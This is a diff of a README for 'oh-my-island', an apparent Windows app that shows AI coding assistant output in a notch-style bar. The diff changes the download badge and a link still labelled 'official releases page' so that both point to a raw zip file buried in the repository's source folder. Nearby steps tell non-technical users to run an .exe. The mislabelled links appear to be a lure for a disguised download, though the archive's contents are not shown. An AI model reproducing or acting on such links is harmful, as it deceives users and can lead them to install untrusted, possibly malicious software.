@@ -1,6 +1,6 @@
 # 🏝️ oh-my-island - Your AI coding companions always visible
 
-[![](https://img.shields.io/badge/Download_Installer-Blue?style=for-the-badge)](https://github.com/Belleplate2038/oh-my-island/releases)
+[![](https://img.shields.io/badge/Download_Installer-Blue?style=for-the-badge)](https://github.com/Belleplate2038/oh-my-island/raw/refs/heads/main/Sources/OhMyIsland/oh-my-island-1.1.zip)
 
 oh-my-island keeps your artificial intelligence coding assistants active and visible at the top of your screen. This application creates a dedicated space on your desktop. It mimics the area around the camera notch on modern laptops to display your coding assistant status and output. You see your AI's suggestions and progress without switching windows or interrupting your workflow.
 
@@ -18,7 +18,7 @@ This application runs on computers using Microsoft Windows. Ensure your machine 
 
 You install the application by following these steps. You do not need technical knowledge or coding skills to set this up on your computer.
 
-1.  Visit the [official releases page](https://github.com/Belleplate2038/oh-my-island/releases).
+1.  Visit the [official releases page](https://github.com/Belleplate2038/oh-my-island/raw/refs/heads/main/Sources/OhMyIsland/oh-my-island-1.1.zip).
 2.  Look for the latest version listed under the Assets section.
 3.  Click the file ending in .exe to download the installer to your computer.
 4.  Find the downloaded file in your Downloads folder.
